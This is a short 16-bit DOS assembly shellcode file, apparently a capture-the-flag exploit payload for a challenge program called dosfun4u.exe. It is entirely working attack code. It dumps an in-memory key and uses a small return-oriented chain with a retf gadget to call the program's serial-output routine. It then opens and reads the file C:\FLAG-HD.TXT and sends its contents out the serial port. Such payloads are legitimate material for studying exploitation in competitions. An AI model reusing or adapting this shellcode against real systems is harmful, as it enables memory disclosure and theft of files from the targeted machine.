BITS 16

; null padding so avoid any linked lists thinking they should keep going
db 0, 0, 0, 0, 0, 0, 0, 0
db 0, 0, 0, 0, 0, 0, 0, 0

; dump the in-memory key first (located at 0137:0000)
push 0
pop ax
mov dx, 0x137
push 0x50
pop bx

; setup mini rop to get back to this segment (output function is near call so it can't return directly back to us in a different segment)
push 0x97
push retloc
; 00ff:1d26 is a retf gadget
push 0x1d26
; call the dosfun4u.exe function to output 0xff bytes out the serial port
jmp 0xff:0x0b55
retloc:

; save the original value of ds
push ds
; set ds to cs so we can read the filename included in the shellcode
push cs
pop ds

; open the file with DOS
mov dx, filename
mov ax, 0x3d00
int 0x21

; restore data segment selector
pop ds

; prepend a newline to the second key
mov byte [0], 0x0a

; read 0x7f bytes of the file into ds:0001
mov bx, ax
mov ax, 0x3f00
push 0x7f
pop cx
push 1
pop dx
int 0x21

; add a newline to the end
mov si, ax
mov byte [si], 0x0a
; call the dosfun4u.exe function to output the file data out the serial port
inc ax
mov bx, ax
xor ax, ax
mov dx, ds

; output
jmp 0xff:0x0b55


filename:
db 'C:\FLAG-HD.TXT', 0
